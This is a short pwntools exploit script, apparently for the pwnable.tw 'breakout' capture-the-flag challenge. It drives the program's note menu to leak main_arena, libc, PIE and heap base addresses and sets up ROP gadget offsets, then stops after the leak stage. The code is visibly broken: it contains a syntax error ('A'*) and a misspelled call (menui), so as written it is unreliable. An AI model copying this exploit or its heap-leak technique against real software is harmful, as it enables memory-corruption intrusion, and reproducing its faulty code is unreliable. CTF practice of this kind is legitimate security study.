from pwn import*
p = process('./breakout')
#p = remote('chall.pwnable.tw',10400)
# gadget
ret = 0x937
leave_ret = 0x42351
# defintion
def menu(sel):
        p.sendafter('> ', sel)

def note(cell,size,note):
        menu('note')
        p.sendafter('Cell: ',str(cell))
        p.sendafter('Size: ',str(size))
        p.sendafter('Note: ',note)

def punish(cell):
        menu('punish')
        p.sendafter('Cell: ',str(cell))

####### ======= exploit ======= #######
### libc leak & heap leak & PIE base leak
menu('A')               # Unknown command 
note(9,0x80,'A'*)
menui('list')

p.recvuntil('A'*8)
p.recv(0x18)
main_arena = u64(p.recv(8))
libc_base = main_arena - 9922288
log.info('main_arena : {}'.format(hex(main_arena)))
log.info('libc_base  : {}'.format(hex(libc_base)))

p.recv(0x8*5)
PIE_base = u64(p.recv(8))-0xf77
log.info('PIE_base   : {}'.format(hex(PIE_base)))

heap_base = u64(p.recv(8)) - 0x124c0
log.info('heap_base  : {}'.format(hex(heap_base)))


